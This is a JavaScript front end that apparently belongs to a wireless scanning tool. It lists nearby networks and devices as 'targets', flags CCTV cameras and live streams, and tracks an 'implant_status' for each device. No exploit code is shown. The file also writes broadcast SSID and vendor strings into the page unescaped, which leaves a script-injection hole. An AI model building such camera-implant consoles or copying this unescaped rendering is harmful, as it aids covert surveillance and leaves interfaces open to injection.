const socket = io();

// Initial fetch
async function updateDevices() {
    try {
        const response = await fetch('/api/devices');
        const devices = await response.json();
        updateDeviceList(devices);
    } catch (err) {
        console.error('Fetch error:', err);
    }
}

async function updateNetworks() {
    try {
        const response = await fetch('/api/networks');
        const networks = await response.json();
        const tbody = document.getElementById('network-list');
        if (!tbody) return;

        if (networks.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="status-waiting">Scanning for APs...</td></tr>';
            return;
        }

        tbody.innerHTML = networks.map(net => `
            <tr>
                <td class="mac">${net.bssid}</td>
                <td>${net.ssid}</td>
                <td>${net.vendor}</td>
                <td class="signal">${net.signal} dBm</td>
                <td>${formatDate(net.first_seen)}</td>
            </tr>
        `).join('');
    } catch (err) {
        console.error('Network fetch error:', err);
    }
}

function updateDeviceList(devices) {
    const tbody = document.getElementById('device-list');
    if (devices.length === 0) {
        tbody.innerHTML = '<tr class="empty-row"><td colspan="7">Scanning for targets...</td></tr>';
        return;
    }

    tbody.innerHTML = devices.map(dev => `
        <tr class="${dev.is_cctv ? 'cctv-row' : ''}">
            <td class="mac">${dev.mac}</td>
            <td>
                ${dev.is_cctv ? '<span class="badge-cctv">CCTV</span>' : ''}
                ${dev.vendor}
            </td>
            <td>
                ${dev.type}
                ${dev.is_streaming ? '<span class="badge-streaming">LIVE</span>' : ''}
            </td>
            <td class="signal">${dev.signal} dBm</td>
            <td>${formatDate(dev.first_seen)}</td>
            <td><span class="status-pill">${dev.implant_status}</span></td>
            <td>
                <button class="btn-small" onclick="viewDevice('${dev.mac}')">Manage</button>
            </td>
        </tr>
    `).join('');
}

function viewDevice(mac) {
    window.location.href = `/device/${mac.replace(/:/g, '-')}`;
}

function formatDate(timestamp) {
    const date = new Date(timestamp * 1000);
    return date.toLocaleTimeString();
}

// Socket updates
socket.on('device_update', (data) => {
    updateDevices();
});

socket.on('implant_active', (data) => {
    console.log('Target active:', data.mac);
    updateDevices();
});

// Update every 3 seconds
setInterval(() => {
    updateDevices();
    updateNetworks();
}, 3000);

updateDevices();
updateNetworks();
